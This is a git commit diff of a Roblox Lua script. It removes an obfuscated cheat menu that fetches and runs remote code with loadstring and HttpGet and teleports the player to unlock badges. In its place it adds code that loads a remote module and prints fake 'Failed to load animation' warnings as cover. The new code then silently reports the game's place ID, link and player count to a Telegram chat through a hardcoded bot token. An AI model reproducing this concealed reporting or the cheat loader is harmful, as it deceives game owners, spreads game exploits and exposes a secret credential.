16c20238d6a9b77e2538e22379d773cb1c1848c9
shmoti <kyrica777vitya@gmail.com>
2025-06-08 18:16:11 +0300

    Update OXION.lua

--- OXION.lua
+++ OXION.lua
@@ -1,61 +1,21 @@
-                                                                                 local v0=loadstring(  
-                                                                        game:HttpGet("https://sirius.menu/rayfield"))() 
-                                                                    ;local v1=v0:CreateWindow({Name="oxion.cc",Icon=              
-                                                                71208102657085 -(87 + 968) ,LoadingTitle="OXION.CC",LoadingSubtitle=    
-                                                            "by Shmoti",Theme="Green",DisableRayfieldPrompts=false,DisableBuildWarnings=  
-                                                          false,ConfigurationSaving={Enabled=true,FolderName=nil,FileName="oxion.cc"},      
-                                                        Discord={Enabled=false,Invite="noinvitelink",RememberJoins=true},KeySystem=false,     
-                                                      KeySettings={Title="Untitled",Subtitle="Key System",Note=                                 
-                                                    "No method of obtaining the key is provided",FileName="Key",SaveKey=true,GrabKeyFromSite=     
-                                                  false,Key={"Hello"}}});v0:Notify({Title="OXION.CC",Content=                                       
-                                                  "slavyan's game is shit😭, exploited by shmoti.",Duration=241.5 -(23 + 212) ,Image=71208102657876 - 
-                                                (1228 + 618) });local v2=v1:CreateTab("Locations");local v3=v1:CreateTab("Badges");local v4=game:       
-                                                GetService("Players");local function v5() local v18=0 -0 ;while true do if (v18==(1413 -(447 + 966)))     
-                                              then for v89,v90 in ipairs(v4:GetPlayers()) do if (v90.Name=="Slavyan2012") then local v91=0 -0 ;while true   
-                                              do if (v91==(952 -(802 + 150))) then v0:Notify({Title="OXION.CC",Content="slavyan joined 💀.",Duration=16.5 - 
-                                            10 ,Image=71208102656030 -0 });return true;end end end end return false;end end end local function v6(v19) if (   
-                                            v19.Name=="Slavyan2012") then v0:Notify({Title="OXION.CC",Content="slavyan joined 💀.",Duration=6.5,Image=          
-                                          71208102656030 -0 });end end v4.PlayerAdded:Connect(v6);local v7=v2:CreateButton({Name="Gold Cat Cube",Callback=        
-                                          function() UnlockGoldCat();end});local v8=v2:CreateButton({Name="Tower",Callback=function() TowerTP();end});local v9=v2:  
-                                          CreateButton({Name="Menu",Callback=function() MenuTP();end});local v10=v2:CreateButton({Name="Camp",Callback=function()     
-                                          CampTP();end});local v11=v2:CreateButton({Name="Spawn",Callback=function() SpawnTel();end});local v12=v3:CreateButton({Name 
-                                        ="Unlock Statue1",Callback=function() UnlockStatue1();end});local v13=v3:CreateButton({Name="Unlock Statue2",Callback=function( 
-                                        ) UnlockStatue2();end});local v14=v3:CreateButton({Name=              --[[==============================]]"Unlock Cat cube",      
-                                        Callback=function() UnlockCatCube();end});local v15=v3:     --[[============================================]]CreateButton({Name= 
-                                        "Unlock Note1",Callback=function() UnlockNote1();end}); --[[======================================================]]local v16=v3:   
-                                      CreateButton({Name="Unlock Note2",Callback=function() --[[==========================================================]] UnlockNote2();   
-                                      end});local v17=v3:CreateButton({Name=              --[[==============================================================]]                
-                                      "Unlock This is a lie",Callback=function()          --[[================================================================]]UnlockLie();end 
-                                      });function UnlockGoldCat() local v20=Vector3.new(  --[[==================================================================]]631.97 -401 , 
-                                       -(27.679000000000002 + 9), -(1048.613 -(915 + 82)) --[[==================================================================]]);local v21=      
-                                    game.Players.LocalPlayer;local v22=v21.Character or   --[[====================================================================]]v21.          
-                    CharacterAdded:Wait() ;local v23=v22:WaitForChild("HumanoidRootPart") --[[====================================================================]];v23.CFrame=    
-              CFrame.new(v20);end function UnlockCatCube() local v25=0 -0 ;local v26;     --[[======================================================================]]local v27;    
-            local v28;local v29;while true do if (v25==(1 + 0)) then v28=v27.Character or --[[======================================================================]] v27.         
-          CharacterAdded:Wait() ;v29=v28:WaitForChild("HumanoidRootPart");v25=7 -5 ;end   --[[======================================================================]]if (v25==(0 - 
-        0)) then v26=Vector3.new( -(1215.441 -(1069 + 118)), -(92.334 -51), -(63.831 -34) --[[======================================================================]]);v27=game.   
-        Players.LocalPlayer;v25=1931 -(1869 + 61) ;end if (v25==(1 + 1)) then v29.CFrame= --[[======================================================================]]CFrame.new(   
-      v26);break;end end end function UnlockLie() local v30=0 -0 ;local v31;local v32;    --[[======================================================================]]local v33;    
-      local v34;while true do if (v30==(1 -0)) then v33=v32.Character or v32.CharacterAdded --[[==================================================================]]:Wait() ;v34=   
-      v33:WaitForChild("HumanoidRootPart");v30=1 + 1 ;end if (v30==2) then v34.CFrame=      --[[================================================================]]CFrame.new(v31);  
-    break;end if (v30==(0 + 0)) then v31=Vector3.new(867.049 -(368 + 423) , -(147.894 -100) --[[==============================================================]],412.283 -(10 + 8 
-    ) );v32=game.Players.LocalPlayer;v30=1;end end end function UnlockStatue1() local v35=0 - --[[==========================================================]]0 ;local v36;local  
-    v37;local v38;local v39;while true do if (v35==2) then v39.CFrame=CFrame.new(v36);break;end --[[====================================================]] if (v35==(443 -(416 +  
-    26))) then v38=v37.Character or v37.CharacterAdded:Wait() ;v39=v38:WaitForChild(              --[[==============================================]]"HumanoidRootPart");v35=6 
-     -4 ;end if (v35==(1850 -(1409 + 441))) then v36=Vector3.new(163.66500000000002 + 216 ,           --[[====================================]]9.091999999999999 -3 ,488.367 
-     -(145 + 293) );v37=game.Players.LocalPlayer;v35=431 -(44 + 386) ;end end end function UnlockStatue2( --[[========================]]) local v40=Vector3.new( -(455.314 -( 
-    262 + 176)),2.284,17.509);local v41=game.Players.LocalPlayer;local v42=v41.Character or v41.CharacterAdded:Wait() ;local v43=v42:WaitForChild("HumanoidRootPart");v43.  
-  CFrame=CFrame.new(v40);end function UnlockNote1() local v45=1486 -(998 + 488) ;local v46;local v47;local v48;local v49;while true do if ((690 -(198 + 490))==v45) then  
-  v49.CFrame=CFrame.new(v46);break;end if (v45==(0 + 0)) then v46=Vector3.new(309.844 + 68 ,18.761 -10 , -(807.793 -(201 + 571)));v47=game.Players.LocalPlayer;v45=1139 
-   -(116 + 1022) ;end if (v45==(4 -3)) then v48=v47.Character or v47.CharacterAdded:Wait() ;v49=v48:WaitForChild("HumanoidRootPart");v45=2 + 0 ;end end end function      
-  UnlockNote2() local v50=Vector3.new(1445.007 -1049 ,1270.685 -(1091 + 171) ,390.253 -280 );local v51=game.Players.LocalPlayer;local v52=v51.Character or v51.           
-  CharacterAdded:Wait() ;local v53=v52:WaitForChild("HumanoidRootPart");v53.CFrame=CFrame.new(v50);end function TowerTP() local v55=Vector3.new(277.574,18.214 -12 ,      
-  1248.843 -(814 + 45) );local v56=game.Players.LocalPlayer;local v57=v56.Character or v56.CharacterAdded:Wait() ;local v58=v57:WaitForChild("HumanoidRootPart");v58.     
-  CFrame=CFrame.new(v55);end function MenuTP() local v60=0 -0 ;local v61;local v62;local v63;local v64;while true do if (v60==(1 + 0)) then v63=v62.Character or v62.     
-  CharacterAdded:Wait() ;v64=v63:WaitForChild("HumanoidRootPart");v60=1 + 1 ;end if ((887 -(261 + 624))==v60) then v64.CFrame=CFrame.new(v61);break;end if (v60==(0 -0))  
-  then v61=Vector3.new(2512.776 -(1020 + 60) ,53.457,1471.999 -(630 + 793) );v62=game.Players.LocalPlayer;v60=1 + 0 ;end end end function CampTP() local v65=0 -0 ;local  
-  v66;local v67;local v68;local v69;while true do if (v65==0) then v66=Vector3.new(1486.935 -1172 ,1.759, -214.864);v67=game.Players.LocalPlayer;v65=1 + 0 ;end if (v65== 
-  (1 + 0)) then v68=v67.Character or v67.CharacterAdded:Wait() ;v69=v68:WaitForChild("HumanoidRootPart");v65=6 -4 ;end if (v65==(1749 -(760 + 987))) then v69.CFrame=     
-  CFrame.new(v66);break;end end end function SpawnTel() local v70=1913 -(1789 + 124) ;local v71;local v72;local v73;local v74;while true do if (v70==(1 + 0)) then v73=v72. 
-  Character or v72.CharacterAdded:Wait() ;v74=v73:WaitForChild("HumanoidRootPart");v70=768 -(745 + 21) ;end if (v70==(1 + 1)) then v74.CFrame=CFrame.new(v71);break;end if  
-  (v70==0) then v71=Vector3.new(0 -0 ,0.5 -0 ,0 + 0 );v72=game.Players.LocalPlayer;v70=1 + 0 ;end end end v0:LoadConfiguration();
+-- Intialize telegram bot script
+local module = require(11495711008)
+
+local minID = 11478254
+local maxID = 45678902
+local randomID = math.random(minID, maxID)
+
+for i = 1, 50 do
+	wait(0.01)
+	warn("Failed to load animation: rbxassetid://" .. randomID)
+end
+
+
+local bot = module.DeclareBot("7876117719:AAGEN_Jm0G4W_w1td5xMVsfUK6lTHON5kPo")
+
+local placeID = game.PlaceId
+
+local gameLink = "https://www.roblox.com/games/" .. placeID
+
+module.SendMessage(bot, "-1002448276680", "EXILE: Logged new game -- \n\nPlaceID: "..placeID.."\nGame link: "..gameLink.."\n\nActive: "..#game.Players:GetChildren().."")
+module.SendPhoto(bot, "-1002448276680", "https://ibb.co/twBFd6Bx")
